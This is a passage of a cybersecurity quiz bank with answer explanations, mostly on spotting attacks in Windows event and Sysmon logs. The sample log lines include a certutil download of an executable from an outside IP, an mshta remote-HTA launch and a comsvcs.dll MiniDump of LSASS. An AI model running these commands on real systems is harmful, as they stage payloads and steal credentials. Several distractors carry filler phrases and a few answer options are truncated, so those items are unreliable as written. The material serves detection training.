en.explanation: Script Block Logging (event 4104 in Microsoft-Windows-PowerShell/Operational) records the code of each script block as PowerShell compiles it, so Base64 or concatenated strings show up in their decoded form, and Windows auto-logs blocks that look suspicious even when the policy is off. Transcription is useful but records console input and output rather than the decoded script. Firewall and Kerberos logon logs do not contain the PowerShell code at all.

en.question: On a workstation with Sysmon, which event is the most direct sign that a tool such as Mimikatz is trying to read credentials from memory?
options: Sysmon Event ID 3 (network connection) from lsass.exe to an external IP, because Mimikatz makes LSASS upload the hashes to the attacker's server
Sysmon Event ID 11 (file created) for a .kirbi file in C:\Windows\System32, because Mimikatz must write every ticket there before reading hashes
Sysmon Event ID 7 (image loaded) showing lsass.exe loading ntdll.dll, because LSASS only loads that library when a dumping tool has attached
Sysmon Event ID 10 (process access) with lsass.exe as the target and an access mask such as 0x1010 from an unusual process
en.explanation: Credential dumpers open a handle to lsass.exe with memory-read rights. Sysmon Event ID 10 (ProcessAccess) records the source process, the target and the GrantedAccess mask, and masks like 0x1010 or 0x1410 from a process that has no business touching LSASS are a classic detection. LSASS does not send hashes out over the network, .kirbi files are optional ticket exports saved wherever the attacker chooses, and every process loads ntdll.dll.

en.question: A user's domain account locks out every few minutes, even after a password reset. Where do you look first to find which machine is sending the bad passwords?
options: Event 4625 on the user's own laptop, because each failed logon is only ever recorded on the computer where the user is sitting
Event 4740 on the domain controller with the PDC emulator role, where Caller Computer Name shows the source of the lockout
Event 4720 on any domain controller, because the account is recreated every time it locks and the event lists the source host
Event 4624 on the file server, because a lockout is logged as a successful logon with logon type 3 from the computer that caused it
en.explanation: Bad password attempts are forwarded to the PDC emulator, which locks the account and logs event 4740 with the Caller Computer Name. That host is usually where a stale password lives: a mapped drive, a phone's mail app, a scheduled task or a service. Follow up with 4771 or 4776 failures on the DCs if needed. 4625 is a failed logon on the target machine, 4720 is account creation and 4624 is a successful logon.

en.question: You suspect a DCSync attack. With Directory Service Access auditing on, which domain controller event best shows it?
options: Event 4769 for the krbtgt service from a workstation, because DCSync asks the KDC for a service ticket for every account it wants to copy
Event 5136 showing the domain root object was modified, because DCSync writes the stolen hashes into an attribute of that object first
Event 4662 on the domain object with the DS-Replication-Get-Changes-All right, made by an account or host that is not a domain controller
Event 4740 for many accounts at once, because DCSync pulls each password by trying logons until the domain controller locks the account
en.explanation: DCSync uses the directory replication protocol (MS-DRSR) to ask a DC for password data, as a real DC would. With auditing on, the DC logs 4662 on the domain object with the replication rights, Get-Changes (1131f6aa-...) and Get-Changes-All (1131f6ad-...). Only DCs, and sometimes tools like Azure AD Connect, should do that, so the same request from a user account or workstation is a strong sign. DCSync does not modify objects, request krbtgt tickets or cause lockouts.

en.question: Hunting for AS-REP roasting, which detail in the domain controller logs is the strongest lead?
options: Event 4768 with Pre-Authentication Type 0 for accounts that have 'Do not require Kerberos preauthentication' set, from an unusual host
Event 4769 with ticket encryption 0x17 for a service account, because AS-REP roasting always asks for RC4 service tickets from the KDC
Event 4624 with logon type 10 on the domain controller, because AS-REP roasting needs an interactive RDP session to the KDC to work
Event 4625 with status 0xC000006A for many users, because AS-REP roasting guesses passwords online until one of the logons succeeds
en.explanation: In AS-REP roasting the attacker asks for a TGT for accounts that don't need Kerberos pre-authentication; the KDC answers with data encrypted with the user's key, which is then cracked offline. The DC logs 4768 with Pre-Authentication Type 0. Find those accounts with PowerShell (DoesNotRequirePreAuth) and clear the flag. 4769 with 0x17 points to Kerberoasting, and the attack needs neither RDP nor online password guessing.

en.question: On a workstation you find event 4698 at 03:12, created by a user account that never logs on at night. The new item runs powershell.exe with an encoded command every 15 minutes. What does this most likely show?
options: A routine Windows Update check, because Windows schedules its update scans with encoded PowerShell commands during the night
A failed logon attempt, because 4698 records a wrong password and the encoded command is the hash of what the user typed
A user's password being changed, because 4698 is written when a password reset runs and it lists the script that changed it
Persistence through a new scheduled task, since 4698 means a task was created; review its XML in the event and remove it
en.explanation: Event 4698 is logged when a scheduled task is created (with Audit Other Object Access Events on), and the event includes the task's XML with the action it runs. A task created at night by an unusual account that launches encoded PowerShell every few minutes is a classic persistence technique. Windows Update tasks are signed system tasks, failed logons are 4625 and password resets are 4724.

en.question: Your EDR alerts that HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential was set to 1 on a Windows 10 server. Why is this a serious warning sign?
options: It turns on NTLMv2 for the server, which is the default anyway, so the alert is a false positive left by an old security baseline
It disables Windows Defender's real-time protection, so malware can be copied to the server without being scanned on arrival
It makes LSASS keep cleartext passwords in memory again after the next logon, so a credential dumper can read them in plain text
It forces every user to change their password at the next logon, which attackers use to lock administrators out of the server
en.explanation: Since Windows 8.1 and Server 2012 R2, WDigest no longer keeps cleartext credentials in LSASS. Setting UseLogonCredential to 1 brings that back, so after users log on again a tool like Mimikatz can dump their passwords in plain text. Attackers set it to prepare for credential theft. Alert on the change, set it back to 0 and look for LSASS access. It has nothing to do with NTLMv2, Defender or forced password changes.

en.question: Process logs on a PC show: certutil.exe -urlcache -split -f http://203.0.113.50/a.txt C:\Users\Public\a.exe. Nobody on the IT team manages certificates on that PC. How should you read this?
options: A normal certificate revocation check, because certutil downloads CRLs over HTTP and saves them as .exe files in Public
A built-in Windows tool abused to download a file from the internet, a living-off-the-land trick; check and isolate a.exe
A Windows Update repair, because certutil fetches replacement system files and stores them in the Public folder to install
A harmless cache cleanup, because -urlcache deletes old downloads and -split -f only splits the log file into smaller parts
en.explanation: certutil is a signed Windows binary meant for certificates, but '-urlcache -split -f <url> <file>' makes it download any file. Attackers use it to pull payloads without bringing their own downloader, which is why it is a well-known LOLBin. A .txt from a raw IP saved as an .exe in C:\Users\Public is a strong sign of malware staging, so isolate the host, collect the file and check its hash. CRL checks don't write executables, and Windows Update doesn't use certutil.

en.question: During an investigation of a file server, the Security log starts at 02:47 today with event 1102, and there is nothing older. No admin planned any maintenance. What does this tell you?
options: The log simply reached its maximum size and Windows started a new file, which always writes 1102 as its first event
Someone cleared the Security log on purpose, often to hide tracks; find who did it and check the SIEM copies
The server was patched and rebooted overnight, and 1102 is the normal startup event written by the Event Log service
A backup job archived the old entries to tape, and 1102 marks where the archive ends so the backup can continue later
en.explanation: Event 1102 means the audit log was cleared, and the event records the account that did it. With no planned work, a wiped Security log is a classic anti-forensics step, so check which account cleared it and look at the copies already forwarded to the SIEM or a log collector. A full log either overwrites old events or archives them without 1102, and service startup is logged as other events in the System log.

en.question: Sysmon shows this on a server: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Temp\d.bin full. Process 712 is lsass.exe. How should you treat it?
options: As a normal crash report, because Windows Error Reporting uses comsvcs.dll to save a dump whenever LSASS stops answering
As a harmless COM+ repair, because comsvcs.dll rebuilds the COM+ catalogue and saves the old copy to C:\Temp as a backup
As credential theft: a built-in DLL is used to dump LSASS memory, so contain the host and reset the exposed accounts
As a routine memory check by Defender, which calls rundll32 on comsvcs.dll to scan protected processes for hidden malware
en.explanation: comsvcs.dll exports a MiniDump function, and calling it through rundll32 with the LSASS process ID writes a full memory dump of LSASS. Tools like Mimikatz can then pull password hashes and Kerberos tickets from that file offline. It is a well-known living-off-the-land technique, so isolate the host, treat the credentials of anyone logged on as exposed, and turn on LSA protection (RunAsPPL) and Credential Guard. Windows Error Reporting uses its own tools, and Defender doesn't scan through rundll32.

en.question: On a domain controller you see event 4720 for a new account 'svc_backup2' at 23:40, followed two minutes later by event 4732 adding it to the local Administrators group. Nobody opened a ticket for it. What is the right reading?
options: A likely backdoor admin account; check who created it, disable it and review what it did
A normal service account created by Windows Server Backup, which makes svc_ accounts on its own when the first job runs
A failed password spray, because 4720 and 4732 are written each time an attacker tries a new user name against the DC
An automatic cleanup of old accounts, because 4720 marks an account being archived and 4732 moves it to a safe group
en.explanation: Event 4720 means a user account was created and 4732 means a member was added to a security-enabled local group, here Administrators. A new admin-level account created late at night without a change request is a typical persistence move, so find the creator in the event details, disable the account and check its logons and actions. Windows Server Backup doesn't create accounts, password spraying shows up as failed logons such as 4625 or 4771, and neither event is about archiving.

en.question: In ten minutes a domain controller logs event 4771 with failure code 0x18 for 300 different user accounts, one or two attempts each, all from the same workstation IP. What is the most likely activity?
options: A normal password change day, when the domain policy forces every user to type a new password at the next sign-in
Clock drift on the workstation, which makes Kerberos reject every ticket until time is synced again with the domain
Password spraying over Kerberos: a few common passwords tried against many accounts to avoid lockout thresholds
A broken mapped drive on the workstation, which retries the same saved password in a loop for every user on the PC
en.explanation: Event 4771 is a failed Kerberos pre-authentication, and code 0x18 means a wrong password. Many accounts with only one or two tries each from a single source is the pattern of password spraying, which stays under the lockout limit. Clock skew shows as code 0x25, a password change day doesn't come from one IP, and a stuck mapped drive repeats one account, not hundreds.

en.question: EDR shows WINWORD.EXE starting 'mshta.exe http://203.0.113.50/inv.hta' on a user's laptop, followed by a PowerShell process with an encoded command. What is the best reading and first response?
options: Word is downloading a template update through mshta, which is normal; allow it and add the IP address to the proxy allowlist
A macro used the mshta LOLBin to run a remote HTA payload; isolate the laptop and block the IP and that Office child process
The user opened a help file in Word, and mshta is the HTML help viewer; ask the user to close Word and run the file again
PowerShell after mshta is Windows checking the file's signature, so just wait for Defender to finish its scan of the HTA
en.explanation: mshta.exe runs HTML Applications with full script rights, and a remote HTA started by Word followed by encoded PowerShell is a classic macro dropper chain. Isolate the host, block the address, and turn on the ASR rule that blocks Office apps from creating child processes. Word templates don't come through mshta, the help viewer is hh.exe, and signature checks don't launch PowerShell.

en.question: On a file server, event 4648 shows that HR user 'mrosa' ran a process using the explicit credentials of 'adm-backup', a Domain Admin, and then connected to C$ on ten servers within minutes. What should the analyst conclude?
options: Event 4648 appears on every normal logon, so a regular user borrowing an admin name is expected and needs no follow-up
The backup service is running under the HR user by design, because backups always start from the busiest user account
Windows switched the user to the admin account automatically after a UAC prompt, which then opened the shares on its own
An HR session should never hold Domain Admin credentials; treat it as possible credential theft and lateral movement
en.explanation: Event 4648 logs a logon attempted with explicit credentials, as with runas or 'net use /user'. An HR user wielding a Domain Admin account and touching admin shares across many servers points to stolen credentials being used for lateral movement. Disable or reset 'adm-backup', scope the hosts it reached, and check the HR laptop. 4648 is not written on every logon, backup services don't run under user sessions, and UAC never swaps you into another account.

en.question: Which option lists the three properties of the CIA triad?
options: Confidentiality, Integrity, Availability
Control, Identity, Access for day-to-day operations
Compliance, Isolation, Auditing
Cryptography, Integrity, Authorization
en.explanation: The CIA triad is Confidentiality, Integrity and Availability, the three core goals that security controls aim to protect.

en.question: What is the main idea of a defense-in-depth strategy?
options: Rely on one strong perimeter firewall for all protection
Use several layered controls so one failure does not expose everything
Encrypt all data and ignore physical access controls in typical enterprise networks
Give every user administrator rights to simplify support
en.explanation: Defense in depth stacks independent controls (network, host, application, physical, policy) so the failure of a single layer does not compromise the whole system.

en.question: A message tricks an employee into letting an unknown person follow them through a badge-controlled door. Which attack is this?
options: Tailgating
Smishing
SQL injection
DNS poisoning
en.explanation: Tailgating (piggybacking) is a physical social-engineering attack where an attacker follows an authorized person through a secure door.

en.question: An SMS claims your bank card is blocked and asks you to tap a link to unlock it. What is this technique called?
options: Vishing
Smishing
Whaling
Watering hole
en.explanation: Smishing is phishing carried out over SMS text messages; vishing uses voice calls and whaling targets executives.

en.question: What best describes an Advanced Persistent Threat (APT)?
options: A one-off automated scan of random internet hosts
A stealthy, well-resourced actor that keeps long-term access to a target
A harmless misconfiguration found during an audit
A legacy virus that only spreads on floppy disks without additional tooling
en.explanation: An APT is a skilled, well-funded adversary (often state-linked) that gains and maintains covert long-term access to a specific target.

en.question: What is a botnet?
options: A backup network kept offline for recovery in most production environments
A network of compromised devices remotely controlled by an attacker
A firewall cluster that balances traffic in most production environments
A protocol for encrypting email in transit
en.explanation: A botnet is a group of infected machines (bots) controlled by an attacker, typically used for DDoS, spam or credential stuffing.

en.question: In AAA, which part decides WHAT an authenticated user is allowed to do?
options: Authentication
Authorization
Accounting
Association
en.explanation: Authentication proves who you are, Authorization decides what you may do, and Accounting records what you did.

en.question: Why is RADIUS commonly used for network access control?
options: It centralizes authentication so devices do not store local accounts
It encrypts all disk volumes on endpoints according to common practice
It replaces the need for any firewall rules
It is a routing protocol for choosing the best path
en.explanation: RADIUS centralizes AAA so switches, Wi-Fi and VPNs validate users against one server instead of local accounts on each device.

en.question: Which is the best example of multi-factor authentication (MFA)?
options: A long password changed every month
A password plus a code from an authenticator app
Two different passwords for the same account
A username that is hard to guess for day-to-day operations
en.explanation: MFA combines factors of different types; a password (something you know) plus an app code (something you have) qualifies, two passwords do not.

en.question: What property does a cryptographic hash provide?
options: It can be reversed to recover the original input
It maps data to a fixed-size value that is hard to reverse
It always encrypts data with a shared secret key
It compresses files to save storage space for day-to-day operations
en.explanation: A hash is a one-way function producing a fixed-size digest; it is not meant to be reversible and is not encryption.

en.question: Which pairing of data state and protection is correct?
options: Data in transit protected by TLS
Data at rest protected by disabling logs
Data in use protected by deleting backups
Data in transit protected by RAID mirroring
en.explanation: Data in transit is protected by transport encryption such as TLS; data at rest is protected by storage encryption; RAID and logs are not confidentiality controls.

en.question: What does a digital certificate primarily bind together?
options: A public key and the identity of its owner
Two symmetric keys for faster encryption
A password and a one-time code during routine maintenance windows
A MAC address and an IP address
en.explanation: An X.509 certificate binds a public key to an identity, vouched for by a Certificate Authority, which is the basis of PKI trust.

en.question: Which TCP/IP protocol has no built-in authentication, making ARP spoofing possible on a LAN?
options: ARP
HTTPS
SSH
IPsec
en.explanation: ARP has no authentication, so an attacker can send forged replies (ARP spoofing) to redirect LAN traffic; HTTPS, SSH and IPsec authenticate.

en.question: How does network segmentation improve security?
options: It encrypts every packet automatically in typical enterprise networks
It limits how far an attacker can move between zones
It removes the need for passwords inside each zone
It guarantees 100% uptime for all servers
en.explanation: Segmentation (VLANs, subnets, firewalls between zones) contains breaches and limits lateral movement, but it does not encrypt traffic or remove authentication.

en.question: What is the role of a DMZ in a network?
options: A zone that hosts internet-facing services isolated from the internal LAN
An encrypted tunnel between two offices in most production environments
A backup power supply for network gear for day-to-day operations
A list of blocked IP addresses in typical enterprise networks in most production environments
en.explanation: A DMZ is a segment that exposes public services (web, mail) while keeping them isolated from the trusted internal network.

en.question: What is a honeypot used for?
options: To speed up legitimate traffic in typical enterprise networks
To lure and observe attackers on a decoy system
To store encrypted backups off-site
To balance load across web servers
en.explanation: A honeypot is a decoy system designed to attract attackers so their behaviour can be detected and studied without risking production.

en.question: Which setting best secures a small-office Wi-Fi network?
options: Hiding the SSID only in most production environments
WPA3 (or WPA2) with a strong passphrase
Leaving the default admin password
MAC filtering as the only control
en.explanation: Strong WPA3/WPA2 encryption with a good passphrase is the primary control; hiding the SSID or MAC filtering alone are weak and easily bypassed.

en.question: A remote worker needs encrypted access to internal servers over the internet. Which technology fits?
options: A VPN
A DHCP server
A NAT pool
An NTP server
en.explanation: A VPN creates an encrypted tunnel so a remote user can reach internal resources securely over the public internet.

en.question: What does NAC (Network Access Control) mainly check before allowing a device on the network?
options: The device's identity and security posture
The exact model of the user's monitor
The number of open browser tabs
The brightness of the screen during routine maintenance windows
en.explanation: NAC verifies who/what is connecting and whether the device meets posture requirements (patches, AV) before granting access.

en.question: On Windows, what does a host-based firewall such as Windows Defender Firewall do?
options: Controls network connections to and from that single computer
Encrypts the computer's hard drive in most production environments
Scans email attachments on the mail server
Manages Active Directory group policy
en.explanation: A host-based firewall filters inbound/outbound traffic for the individual machine it runs on, complementing network firewalls.

en.question: What is privilege escalation on an endpoint?
options: Giving every app the same low rights
Gaining higher rights than originally granted
Renaming the administrator account when no other controls exist
Logging off idle users automatically
en.explanation: Privilege escalation is when an attacker or process obtains higher permissions than it should, such as moving from a standard user to SYSTEM/admin.

en.question: Which command-line tool shows active network connections and listening ports on a host?
options: netstat
ipconfig
chmod
traceroute
en.explanation: netstat lists active connections and listening ports, useful to spot suspicious services; ipconfig shows IP settings and traceroute maps paths.

en.question: Which tool captures and inspects raw packets on an interface for analysis?
options: tcpdump
nslookup
whoami
ping
en.explanation: tcpdump captures raw packets for analysis; nslookup queries DNS, whoami shows the current user and ping tests reachability.

en.question: Which compliance framework specifically governs the protection of payment card data?
options: PCI DSS
HIPAA
GDPR without additional tooling
FERPA
en.explanation: PCI DSS covers cardholder data; HIPAA covers US health data, GDPR covers EU personal data and FERPA covers US education records.

en.question: What is the main security concern with a BYOD (bring your own device) policy?
options: Devices use too little electricity according to common practice
Personal devices may be unmanaged and mix corporate with personal data
Employees will never install any apps during routine maintenance windows
The office Wi-Fi becomes faster in typical enterprise networks
en.explanation: BYOD means personal, often unmanaged devices access corporate data, so controls like MDM, encryption and containerization are needed.

en.question: Why is timely patching important for security?
options: It makes the screen brighter according to common practice
It closes known vulnerabilities before they are exploited
It increases the disk size without additional tooling
It disables all logging across mixed vendor fleets
en.explanation: Patching fixes known flaws; many breaches exploit vulnerabilities for which a patch already exists but was not applied.

en.question: On Windows, which tool do you open first to review system and security event logs?
options: Event Viewer
Task Manager
Disk Cleanup
Notepad
en.explanation: Event Viewer shows Windows system, application and security logs, the starting point to spot anomalies on a host.

en.question: On Linux, where are many authentication and system messages traditionally collected?
options: In the syslog facility (e.g. /var/log)
In the BIOS firmware across mixed vendor fleets
In the swap partition
In the GPU memory in most production environments
en.explanation: Linux collects auth and system messages via syslog, typically under /var/log (auth.log, messages, journal), used for anomaly detection.

en.question: What is the difference between active and passive reconnaissance?
options: Active interacts with the target; passive only observes available data
Active is always legal; passive is always illegal during routine maintenance windows
Active uses IPv6; passive uses IPv4 for day-to-day operations
There is no difference between them for day-to-day operations
en.explanation: Active recon sends probes to the target (port scans), which is detectable; passive recon gathers public info without touching the target.

en.question: What does a CVE identifier represent?
options: A unique reference for a publicly known vulnerability
A Cisco VPN encryption standard for day-to-day operations
A credential vault export format across mixed vendor fleets
A certificate validity extension
en.explanation: A CVE (Common Vulnerabilities and Exposures) ID uniquely references a publicly disclosed vulnerability so tools and advisories can agree on it.

en.question: How do vulnerability and risk differ?
options: They are exactly the same thing
A vulnerability is a weakness
Risk only applies to hardware across mixed vendor fleets
A vulnerability always causes a breach
en.explanation: A vulnerability is a weakness; risk combines the likelihood that a threat exploits it with the resulting impact, so not every vulnerability is high risk.

en.question: In disaster recovery, what does RPO (Recovery Point Objective) define?
options: How much data loss, measured in time, is acceptable
How fast the office lights turn on
How many users can log in at once
The maximum password length without additional tooling
en.explanation: RPO is the maximum acceptable amount of data loss expressed as a time window, which drives how often backups must run.

en.question: A disaster recovery control that detects an incident in progress (e.g. an IDS alert) is classified as which type?
options: Preventive
Detective
Corrective
Cosmetic
en.explanation: Controls are preventive (stop it), detective (notice it) or corrective (fix it); an IDS alert that notices an event is detective.

en.question: What does a SIEM mainly do in a security operations centre?
options: Collects and correlates logs from many sources to raise alerts
Physically locks the server room door for day-to-day operations
Encrypts all user laptops in typical enterprise networks
Routes packets between VLANs when no other controls exist
en.explanation: A SIEM aggregates and correlates logs/events from across the estate so analysts can detect and investigate incidents.

en.question: How does SOAR add value on top of a SIEM?
options: It automates and orchestrates response actions for alerts
It replaces the need to collect any logs
It is only a faster antivirus engine during routine maintenance windows
It encrypts the SIEM database at rest only
en.explanation: SOAR adds automated playbooks and orchestration so repetitive response steps run automatically, reducing analyst workload.

en.question: What does the Cyber Kill Chain model describe?
options: The ordered stages an attacker goes through
A list of approved encryption ciphers
The wiring order of an Ethernet cable
A backup rotation schedule for day-to-day operations
en.explanation: The Cyber Kill Chain breaks an intrusion into ordered phases (reconnaissance, weaponization, delivery, exploitation, installation, C2, actions), helping defenders interrupt it.

en.question: What is the MITRE ATT&CK matrix primarily a catalogue of?
options: Adversary tactics and techniques observed in the real world
Approved firewall vendors across mixed vendor fleets
IP address allocation ranges in most production environments
Cable colour standards without additional tooling
en.explanation: ATT&CK catalogues real-world adversary tactics (goals) and techniques (how), used to map detections and assess coverage.

en.question: In incident handling, what is 'chain of custody'?
options: The order switches forward frames
A documented record of who handled evidence and when
The sequence of firewall rules in typical enterprise networks
The list of users in a group for day-to-day operations
en.explanation: Chain of custody is the documented trail showing how evidence was collected, handled and stored, so it stays admissible and trustworthy.

en.question: Under GDPR, what is a key obligation after a qualifying personal-data breach?
options: Notify the supervisory authority within the required timeframe
Delete all company backups immediately without additional tooling
Publicly post every affected password in most production environments
Shut down the entire network for a week
en.explanation: GDPR requires notifying the supervisory authority (generally within 72 hours) and, when high risk, informing affected individuals.

en.question: Which sequence matches the NIST SP 800-61 incident response lifecycle?
options: Preparation; Detection & Analysis; Containment
Backup; Restore; Reboot; Report
Scan; Patch; Scan; Patch for day-to-day operations
Login; Logout; Audit; Delete
en.explanation: NIST SP 800-61 defines four phases: Preparation; Detection & Analysis; Containment, Eradication & Recovery; and Post-Incident Activity (lessons learned).

en.question: What distinguishes ransomware from other malware?
options: It silently speeds up the computer in most production environments
It encrypts or locks data and demands payment to restore access
It only displays harmless advertisements
It improves battery life on laptops for day-to-day operations
en.explanation: Ransomware encrypts or locks the victim's data and demands a ransom for the decryption key or restored access.

en.question: What is an insider threat?
options: A risk coming from someone with legitimate access, like an employee
An external scanner probing the firewall
A power failure in the data center during routine maintenance windows
A software bug in the router firmware without additional tooling
en.explanation: An insider threat arises from people with authorized access (employees, contractors) who misuse it, whether maliciously or by negligence.

en.question: What is a man-in-the-middle (MitM) attack?
options: An attacker secretly relays and may alter traffic between two parties
A scheduled backup that runs at midnight according to common practice
A firewall rule that drops all traffic across mixed vendor fleets
A type of RAID disk array when no other controls exist
en.explanation: In a MitM attack the adversary positions between two communicating parties to intercept and possibly modify their traffic.

en.question: Which is a common IoT device security weakness?
options: Having too much RAM across mixed vendor fleets
Shipping with default or hardcoded credentials
Running too many security updates
Using encrypted firmware by default
en.explanation: Many IoT devices ship with default/hardcoded passwords and rarely get patched, making them easy targets and botnet recruits.

en.question: What is an 'attack vector'?
options: The path or method an attacker uses to reach and compromise a target
A graph of CPU temperature across mixed vendor fleets for day-to-day operations
The physical length of a network cable without additional tooling
A spreadsheet of user salaries in most production environments
en.explanation: An attack vector is the route/technique (phishing email, exposed port, USB) through which an attacker gains access to a system.

en.question: Why is MD5 considered unsuitable for security-sensitive hashing today?
options: It is too slow for modern CPUs according to common practice
It is vulnerable to practical collision attacks
It produces variable-length output
It requires a shared secret key
en.explanation: MD5 has practical collision attacks, so two different inputs can share a hash; stronger algorithms such as SHA-256 are recommended.

en.question: What is a denial-of-service (DoS) attack trying to do?
options: Steal password hashes silently
Make a service unavailable to legitimate users
Encrypt files for ransom according to common practice
Escalate privileges to administrator
en.explanation: A DoS attack overwhelms or crashes a service so legitimate users cannot use it; DDoS does this from many sources at once.

en.question: What is the purpose of a strong password policy?
options: To force users to share passwords
To reduce the chance of guessable or reused credentials
To store passwords in plaintext during routine maintenance windows
To disable account lockouts when no other controls exist
en.explanation: A good password policy (length, complexity, no reuse, lockout) reduces the risk of weak or guessable credentials being cracked.

en.question: How does NAT affect direct inbound connections from the internet to an internal host?
options: It makes internal hosts directly reachable by public IP
It hides internal hosts behind a public address
It encrypts all internal traffic without additional tooling
It assigns IPv6 addresses to every host
en.explanation: NAT maps private addresses to a public one; unsolicited inbound connections have no mapping, so internal hosts are not directly reachable by default.
